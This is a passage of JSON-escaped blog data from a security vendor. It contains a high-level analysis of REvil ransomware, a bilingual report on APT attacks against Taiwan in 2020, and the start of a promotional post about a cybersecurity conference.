page.[4])\n\n\u003cbr\u003e\n\n![REvil__4.jpeg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_4_56bc894487.jpg)\n_Figure 4: The timeline of REvil's notorious attacks_\n\n\u003cbr\u003e\n\n## The Ransomware as a Service model (RaaS)\n\nThe actors of REvil adopt the Ransomware as a Service business model. In this model, Ransomware developers are responsible for development and maintenance of the ransomware, while the groups of cyber criminals, named affiliates in this model, are responsible for accessing victims' system to distribute the ransomware. The business model allows cyber criminals who are not capable of developing their own ransomware to buy the service on dark web and deploy ransomware attack. \n \nThrough this model, REvil actors provide REvil or the customized version of REvil to their affiliates. After they successfully breached victims' systems, REvil actors will ask for ransom by themselves, providing the ransom payment link. After the collection of money, their affiliates will receive 60% to 75% of the profit. Moreover, the actors also provide other paid services, such as money laundering assistance for the affiliates. \n\n![May_blog_3.jpeg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620634812/May_blog_3_71c24e74f2.jpg)\n\n\u003cbr\u003e\n\n## Tactic, Techniques and Procedures\n### Initial Access\nFor REvil, different affiliates may use different methods for initial access. The ransomware is now distributed primarily through compromised RDP sessions (65%), phishing (16%), and software vulnerabilities (8%).[5] However, a supply chain attack distributing REvil was also observed.\n\nREvils' actors said in an interview that they used brute force attacks to compromise RDP sessions.[1] As for phishing emails, the cyber criminals have once disguised their email as a new booking from \"booking.com\". They also exploit vulnerabilities. In fact, REvil's debut was exploiting the Oracle Weblogic vulnerability, CVE-2019-2725. Moreover, the actors are able to deploy new vulnerabilities after its disclosure. For example, the group used the recent disclosed Microsoft Exchange server vulnerability to access Acer's system.\n\nThe most astounding technique they deployed is supply chain attack. Around June 2019, a WINRAR distributor site in Italy was hacked.[6][7] The software downloaded from the site at that time was not the WINRAR installer but the REvil installer. Although no public announcements showing that any company was infected in this attack, the successful replacement shows that their affiliates were able to deploy a supply chain attack. \n\nApart from their various method on initial access, the cyber criminals also adopted several unique techniques. For example, REvil used Elliptic-curve Diffie-Hellman key exchange to encrypt files, while other ransomware often used RSA, Salsa20 or AES to do so. This method is more efficient as it used shorter key and is difficult to decrypt. \n\n\u003cbr\u003e\n\n## The Effective Methods for Ransom Collection\nNowadays, as ransomware attacks become a serious problem, most companies have learned to back up crucial data in case they are hit by a ransomware. However, ransomware actors develop several new methods to ensure that the victims will pay the ransom, including Double-extortion, VoIP calling, and DDoS attack.\n\n- \"Double-extortion\"\nThe actors disclose or sell the data of the company if the company is not willing to pay ransom. This method was first introduced by Maze, another notorious ransomware, and currently almost all ransomware actors have adopted this method, and so as REvil. Starting from January 2020, the group runs their own site \"Happy Blog\", where they post data extorted from their victims.\n\n- Voice over Internet Protocol (VoIP) calling\nIn February 2021, they announced that they are now offering Voice over Internet Protocol (VoIP) calling and DDoS attack service for their affiliates to make pressure on their victims.[8] They stated that they will call the media or their victims' business partners, telling them about the attack. \n\n\u003cbr\u003e\n\n## Detect and Defense\nFor prevention, it is always crucial to be aware of spamming emails. Nowadays, spamming emails is still the most popular and effective method to access victims' computers. \n\nIn addition, keep an eye on new exploits and updates is also important. Ransomware groups usually are not capable of discovering 0-day exploits by themselves, but they will exploit the disclosed vulnerabilities and attack those who have not updated their system. Thus, keep computers updated and patched systems immediately after the disclosure is essential for preventing ransomware attack.\n\nFurthermore, as the REvil business grows, the actors behind has posted on dark web to recruit more affiliates for their operations. Thus, more attacks from the group is expected. TeamT5 will keep following the ransomware and provide up-to-date information of the notorious ransomware.\n\nTo efficiently prevent ransomware attacks, TeamT5 offers a total solution for enterprise protection. Our unique ransomware containment technology is proven to successfully block many types of ransomware, which can detect and stop malicious ransomware immediately. And even restore encrypted files from the backup.\n\nFor more information about TeamT5 Ransomware Prevention total solution, please contact: \u003csales@teamt5.org\u003e\n\n\u003cbr\u003e\n\n## References\n\n[1] https://therecord.media/i-scrounged-through-the-trash-heaps-now-im-a-millionaire-an-interview-with-revils-unknown/\n\n[2] https://www.advanced-intel.com/post/inside-revil-extortionist-machine-predictive-insights\n\n[3] https://www.zdnet.com/article/gandcrab-ransomware-operation-says-its-shutting-down/\n\n[4] Texas Municipalities - https://www.zdnet.com/article/at-least-20-texas-local-governments-hit-in-coordinated-ransomware-attack/; Backup Company - https://www.zdnet.com/article/ransomware-hits-hundreds-of-dentist-offices-in-the-us/; Foreign Exchange Company - https://www.bbc.com/news/business-51017852; US Law Firm - https://www.zdnet.com/article/ransomware-gang-asks-42m-from-ny-law-firm-threatens-to-leak-dirt-on-trump/; Pan-Asia Retailer - https://www.bleepingcomputer.com/news/security/pan-asian-retail-giant-dairy-farm-suffers-revil-ransomware-attack/\n\n[5] https://www.csoonline.com/article/3597298/revil-ransomware-explained-a-widespread-extortion-operation.html\n\n[6] https://www.drcommodore.it/2019/06/20/hackerato-winrar-it-malware-al-posto-del-programma/\n\n[7] https://www.bleepingcomputer.com/news/security/sodinokibi-ransomware-spreads-wide-via-hacked-msps-sites-and-spam/\n\n[8] https://www.bleepingcomputer.com/news/security/ransomware-gang-plans-to-call-victims-business-partners-about-attacks/\n","title":"Introducing The Most Profitable Ransomware REvil","__v":0,"id":"6098e8e32107530037594ad4"}],"createdAt":"2021-05-10T08:03:47.679Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","publish_date":"2021-06-02T02:30:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1621592937/security_5614016_1920_e059cbe3c6.png","id":"6098e8e32107530037594ad3"}],"_id":"609899422107530037594a80","post_url":"apt-threat-landscape-of-taiwan-in-2020","post_name":"2020 年台灣 APT 網路攻擊態勢","publish_date":"2021-05-10T03:30:00.000Z","contents":[{"locale":"tw","_id":"609899422107530037594a81","context":"**By TeamT5 杜浦數位安全 技術長 李庭閣 Charles Li**\n\n2020 年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5 相信認識敵人是有效對抗針對性攻擊的第一步，而本文章主要針對 2020 年間所觀察到的 APT 網路攻擊態勢，提供一個概觀說明。TeamT5 威脅情資研究顯示 APT 攻擊手法持續進化，真正高端複雜的行動已經不可能由單一個資安產品做有效的防護。TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/) 是一個以網路威脅情資為核心概念的防護方案，同時我們有一群專業的專家分析師持續做研究來讓我們持續領先於攻擊者的腳步。\n\n\u003e 如果您希望進一步了解我們的資安產品、解決方案或是想跟我們討論您所面臨的網路威脅，我們誠摯歡迎您與我們聯絡：\u003csales@teamt5.org\u003e\n\n\u003cbr\u003e\n\n### 參考資料\n\n[1] https://www.ithome.com.tw/news/139331\n\n[2] https://www.slideshare.net/codeblue_jp/cb19-resistance-is-futilethe-undefendable-supplychain-attack-by-sungting-tsai-linda-kuo\n\n[3] https://www.youtube.com/watch?v=1KXb-sf_wos\n\n[4] https://www.reuters.com/article/us-cyber-heist-north-korea-taiwan-idUSKBN1CL2VO","title":"2020 年台灣 APT 網路攻擊態勢","__v":0,"id":"609899422107530037594a81"},{"locale":"en","_id":"609899422107530037594a82","title":"APT Threat Landscape of Taiwan in 2020","__v":0,"context":"**By TeamT5 CTO Charles Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend. TeamT5 has a cyber threat intelligence (CTI) centered solution, [ThreatVision](https://teamt5.org/en/products/threatvision/), and we rely on a dedicated team of security experts to keep us steps ahead of threat actors. Feel free to contact TeamT5 in case you want to know more about our products, solutions or discuss about threats you are facing.\n\n\u003e Contact us: \u003csales@teamt5.org\u003e\n\n\u003cbr\u003e\n\n### Reference\n\n[1] https://www.ithome.com.tw/news/139331\n\n[2] https://www.slideshare.net/codeblue_jp/cb19-resistance-is-futilethe-undefendable-supplychain-attack-by-sungting-tsai-linda-kuo\n\n[3] https://www.youtube.com/watch?v=1KXb-sf_wos\n\n[4] https://www.reuters.com/article/us-cyber-heist-north-korea-taiwan-idUSKBN1CL2VO\n\n","id":"609899422107530037594a82"}],"createdAt":"2021-05-10T02:24:02.304Z","updatedAt":"2021-06-10T04:40:39.875Z","__v":1,"topic":{"category":"blogs","_id":"5ecaa012a792d70040a0d8b1","name":"Threat Intelligence","color":"#6d96bd","createdAt":"2020-05-24T16:25:54.069Z","updatedAt":"2020-06-07T22:08:35.541Z","__v":0,"contents":[{"locale":"en","_id":"5edd6563bf58af004a154113","text":"Threat Intelligence","createdAt":"2020-06-07T22:08:35.507Z","updatedAt":"2020-06-07T22:08:35.507Z","__v":0,"id":"5edd6563bf58af004a154113"},{"locale":"tw","_id":"5edd6563bf58af004a154114","text":"威脅情資","createdAt":"2020-06-07T22:08:35.507Z","updatedAt":"2020-06-07T22:08:35.507Z","__v":0,"id":"5edd6563bf58af004a154114"},{"locale":"jp","_id":"5edd6563bf58af004a154115","text":"脅威情報","createdAt":"2020-06-07T22:08:35.507Z","updatedAt":"2020-06-07T22:08:35.507Z","__v":0,"id":"5edd6563bf58af004a154115"}],"id":"5ecaa012a792d70040a0d8b1"},"author":{"confirmed":true,"blocked":false,"_id":"5ece27142e1ee4004aa406ef","username":"Charles Li","email":"charles@example.com","provider":"local","createdAt":"2020-05-27T08:38:44.130Z","updatedAt":"2021-05-10T02:25:52.290Z","__v":0,"role":"5e467d0375f9d7007998aebf","id":"5ece27142e1ee4004aa406ef"},"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1620615558/1_99cbb30acf.png","been_relative_posts":[{"publish":true,"enable_form":false,"tags":["5ece28882e1ee4004aa406f2","5eec1394163518003f86d929","5f979c9e1d1f9c004b931d5c","6063e4e43e88da003f2f660c"],"relative_posts":["5f2cd17b163518003f86da5b","609899422107530037594a80","60a365f93f9d29004041a487","609b4c052107530037594b01","60b5e6a53f9d29004041a4cd","6077e82e2107530037594a03"],"_id":"6059a16cc56e80003f985a6f","post_url":"cybersec-2021","post_name":"【CYBERSEC 2021 台灣資安大會】企業防駭，交給 TeamT5","contents":[{"locale":"tw","_id":"605a9d11c56e80003f985a7a","title":"【CYBERSEC 2021 台灣資安大會】企業防駭，交給 TeamT5","context":"\u003cbr\u003e\n\n全臺最大的年度資安盛會 CYBERSEC 2021 臺灣資安大會，將在 5 月 4 日至 5 月 6 日於南港展覽二館超規格登場！今年，TeamT5 杜浦數位安全很榮幸擔任大會的鑽石級贊助夥伴，面對無所不在的網路威脅，以及不斷進化、「數位轉型」的勒索軟體攻擊，身為臺灣本土資安廠商，我們將持續為大家洞悉網路威脅，精準防駭。\n\n\u003e 節目單在手，講座不漏聽：完整攤位限定講座節目單[點此下載](https://lihi1.cc/Pi626)。\n\n\u003cbr\u003e\n\n# 企業防駭，交給 TeamT5\n\n![展攤位置圖_改搜索實境.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619071416/_497fed2229.png)\n\n\u003cbr\u003e\n\n## #L03 主攤位 | TeamT5 杜浦數位安全\n\n無論是面對駭客威脅想找解方、對勒索軟體束手無策，還是有各種資安防護的疑難雜症 ... 別駭怕，快來 **#L03** 攤位找 **TeamT5 杜浦數位安全**！\n\n除了我們獨特的威脅解決方案，現場還有產品 Demo、攤位限定講座、資安小遊戲，以及徵才駐點面談等精彩內容，錯過再等明年！\n\n\u003cbr\u003e\n\u003cstyle\u003e\nspan.post-cybersec-2021-dot {\njustify-content: center;\ncolor: #d83751;\nfont-family: initial;\nwidth: 1em;\nfont-size: 22px;\nmargin-right: 12px;\n}\n\u003c/style\u003e\n\u003ch3 id=\"teamt5-moma\"\u003e\n  \u003cspan class=\"post-cybersec-2021-dot\"\u003e•\u003c/span\u003e\u003cspan\u003e臺灣資安大會首次登場，TeamT5 MoMA\u003c/span\u003e\n\u003c/h3\u003e\n\n他們是誰？來自哪個國家？好奇總是躲在暗處、神秘莫測的駭客攻擊族群究竟長什麼模樣嗎？\n\n誰說資安艱澀又無聊，跟著 TeamT5 的視角，帶您一同探索當代 APT 攻擊族群的神秘世界。\n\n\u003cbr\u003e\n\n*更多關於 TeamT5 MoMA 的展覽訊息，請隨時鎖定 TeamT5 [Facebook 粉絲專頁](https://www.facebook.com/TeamT5.org)。\n\n\u003cbr\u003e\n\n\n\u003ch3\u003e\n  \u003cspan class=\"post-cybersec-2021-dot\"\u003e•\u003c/span\u003e\u003cspan\u003eTeamT5 攤位限定講座\u003c/span\u003e\n\u003c/h3\u003e\n\nL03 主攤位的限定講座，涵蓋四大精彩主題：**加密勒索攻擊防護**、**駭客情資追蹤**、**威脅狩獵指南**、**企業資安防護一次到位**，多元內容、一次滿足！我們也特地邀請到資安產業的專家，與大家分享資安海外拓展的成功經驗，以及對抗勒索軟體的應對之道，大咖雲集，不聽可惜！不只多場專業講座，我們也將在 CYBERSEC 2021 臺灣資安大會獨家公開 TeamT5 威脅狩獵解方 [ThreatSonar](https://teamt5.org/tw/products/threatsonar/) 的全新功能，\b敬請期待更強大、全面升級的威脅捕網！\n\n![facebook_Post_0504.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0504_188c94772c.png)\n\n![facebook_Post_資安海外拓展交流.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619751063/facebook_Post_1f01f9d820.jpg)\n\n![facebook_Post_0505.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0505_6ab020f1f5.png)\n\n![圖片5.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619884408/5_7cfb9d9ff9.jpg)\n\n![facebook_Post_0506.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0506_e691090746.png)\n\n\u003cbr\u003e\n\n每日中午時段還有 **TeamT5 Show 一下**，安排 TeamT5 MoMA 攻擊族群博物館限定導覽、搜索實境遊戲「1337 Operation」關主現身說法，獨家公布破關彩蛋，以及「資安 Show Time」問答賽，歡迎各位前來參觀同樂。\n\n![facebook_Post_0504-0506.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0504_0506_37a651b222.png)\n \n\u003cbr\u003e\n\n## #CP01 Playground | 1337 Operation 搜索實境\n \nTeamT5 團隊精心設計，融入真實情節的搜索實境駭客版，首次於資安大會 CYBERSEC Playground 亮相！\n \n歡迎大家到 **#CP01** 遊戲攤位大展身手，1337 Operation 搜索實境，TeamT5 探員等你來挑戰！\n \n*更多資訊請見[臺灣資安大會官網](https://cyber.ithome.com.tw/2021/playground#teamT5)。\n \n![1337.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1617477157/1337_6a0024e9ad.png)\n \n\u003cbr\u003e\n\n## #CT11 Cyber Talent Connect | 徵才專區\n\n今年臺灣資安大會加碼增設的 Cyber Talent Connect 專區，透過培育計畫、主題講座、職涯互動及企業徵才，協助在學學生與社會新鮮人更了解業界人才需求，以及進入資安領域的職能發展。\n\nTeamT5 杜浦數位安全在 **#CT11** 攤位，歡迎有志進入資安產業的朋友們來參觀了解。也歡迎大家來 Cyber Talent 講座，聽聽我們的企業分享與最新市場徵才趨勢，**#L03 **主攤位亦設有** TeamT5 徵才駐點**，對我們最新職缺有興趣的朋友，記得到主攤位來逛逛喔！\n\n![facebook_Post_Turkey.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_Turkey_291def5611.png)\n\n\u003cbr\u003e\n\n## TeamT5 大會主題議程\n\nTeamT5 強大講師陣容將再次登上大會主題演講，除了去年好評不斷的 CyberLAB 資安攻防演練工作坊重出江湖，還有今年最受矚目的大會主題論壇「701 